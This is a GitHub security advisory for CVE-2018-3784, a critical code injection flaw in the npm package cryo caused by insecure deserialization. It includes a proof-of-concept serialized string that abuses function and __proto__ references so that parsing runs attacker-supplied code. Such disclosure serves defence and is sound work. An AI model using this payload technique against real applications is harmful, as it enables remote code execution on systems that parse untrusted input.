# [C] Code Injection in cryo

## Summary
Severity: Critical
Advisory: GHSA-38f5-ghc2-fcmv
CVE: CVE-2018-3784
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2018-08-21
Source: https://github.com/advisories/GHSA-38f5-ghc2-fcmv
Type: github-advisory

## Affected
- npm: `cryo` — affected >=0

## Details
All versions of `cryo` are vulnerable to code injection due to an Insecure implementation of deserialization.


## Proof of concept

```js
var Cryo = require('cryo');
var frozen = '{"root":"_CRYO_REF_3","references":[{"contents":{},"value":"_CRYO_FUNCTION_function () {console.log(\\"defconrussia\\"); return 1111;}"},{"contents":{},"value":"_CRYO_FUNCTION_function () {console.log(\\"defconrussia\\");return 2222;}"},{"contents":{"toString":"_CRYO_REF_0","valueOf":"_CRYO_REF_1"},"value":"_CRYO_OBJECT_"},{"contents":{"__proto__":"_CRYO_REF_2"},"value":"_CRYO_OBJECT_"}]}'
var hydrated = Cryo.parse(frozen);
console.log(hydrated);
```


## Recommendation

No fix is currently available. Consider using an alternative module until a fix is made available.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2018-3784
- https://hackerone.com/reports/350418
- https://github.com/advisories/GHSA-38f5-ghc2-fcmv
- https://www.npmjs.com/advisories/690
